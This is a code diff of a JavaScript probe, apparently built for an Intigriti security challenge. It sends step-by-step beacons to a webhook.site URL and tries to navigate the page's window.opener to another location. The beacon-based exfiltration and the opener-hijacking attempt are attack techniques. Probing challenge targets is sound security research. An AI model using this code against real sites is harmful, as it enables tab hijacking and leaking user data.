@@ -5,33 +5,39 @@
 const hook = 'https://webhook.site/64c5c665-4956-4bb1-8789-33afe479778c';
 const id = Math.random().toString(36).slice(2);
 
-function ping(q) {
-  fetch(hook + q + '&id=' + id, { mode: 'no-cors' });
+function ping(step, extra = '') {
+  const url = `${hook}?step=${encodeURIComponent(step)}&id=${encodeURIComponent(id)}${extra}`;
+  const img = new Image();
+  img.src = url;
 }
 
-ping('?step=loaded');
+ping('loaded');
 
-ping('&step=opener_exists=' + (!!window.opener));
+try {
+  ping('opener_exists', `&value=${encodeURIComponent(String(!!window.opener))}`);
+} catch (e) {
+  ping('opener_exists_err', `&value=${encodeURIComponent(String(e))}`);
+}
 
 try {
   if (window.opener) {
-    ping('&step=opener_closed=' + window.opener.closed);
+    ping('opener_closed', `&value=${encodeURIComponent(String(window.opener.closed))}`);
   }
 } catch (e) {
-  ping('&step=opener_closed_err=' + encodeURIComponent(String(e)));
+  ping('opener_closed_err', `&value=${encodeURIComponent(String(e))}`);
 }
 
 try {
   if (window.opener) {
     window.opener.location = 'https://challenge-0326.intigriti.io/challenge.html?from=opener_probe';
-    ping('&step=opener_nav_attempted=true');
+    ping('opener_nav_attempted', '&value=true');
   }
 } catch (e) {
-  ping('&step=opener_nav_err=' + encodeURIComponent(String(e)));
+  ping('opener_nav_err', `&value=${encodeURIComponent(String(e))}`);
 }
 
 setTimeout(() => {
-  ping('&step=done');
+  ping('done');
 }, 1500);
 </script>
 OK
